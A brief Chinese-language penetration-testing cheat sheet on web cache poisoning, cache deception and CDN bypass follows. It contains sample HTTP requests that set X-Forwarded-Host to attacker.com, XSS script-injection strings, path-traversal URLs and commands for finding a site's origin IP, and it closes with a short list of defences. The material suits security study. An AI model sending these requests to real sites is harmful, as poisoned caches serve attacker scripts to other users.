# 缓存与CDN安全补充

## 1. 缓存投毒

### HTTP头投毒

```
# 注入恶意Header
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com

# 响应被缓存
# 后续用户访问会加载attacker.com的资源
```

### Cookie投毒

```
# 设置Cookie
GET / HTTP/1.1
Cookie: XSS="><script>alert(1)</script>

# 缓存
# 后续用户会受攻击
```

---

## 2. 缓存欺骗

### 路径穿越

```
http://target.com/css/..;/main.js
http://target.com/home/..;/profile.js
```

### Web缓存欺骗

```
# 攻击者访问
GET /test/<script>alert(1)</script>.js HTTP/1.1
Host: target.com

# 缓存
# 受害者访问相同路径会执行恶意JS
```

---

## 3. CDN绕过

### 源站IP发现

```bash
# DNS查询
dig target.com
nslookup target.com

# 子域名发现
subfinder -d target.com

# SSL证书
curl -v https://target.com
openssl s_client -connect target.com:443
```

### 配置错误

```
# 回源地址可访问内部服务
# 允许列目录
# 敏感文件泄露
```

---

## 4. HTTP缓存投毒攻击链

### 步骤1: 识别缓存键

```
# 通常是完整URL或去掉查询参数的URL
GET /static/js/app.js
GET /api/user?id=1
```

### 步骤2: 构造恶意请求

```
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

### 步骤3: 等待缓存

```
# 缓存生效
# 后续用户访问会加载attacker.com的恶意JS
```

---

## 5. 缓存利用示例

### XSS缓存投毒

```
# 设置响应头
GET /login HTTP/1.1
X-XSS-Protection: 0

# 配合反射型XSS
```

### 敏感信息缓存

```
# 登录后的敏感页面被缓存
# 后续未授权用户访问泄露信息
```

---

## 6. 防御措施

- 缓存键包含完整Host
- 验证Host头
- 禁用危险Header缓存
- 使用Vary头
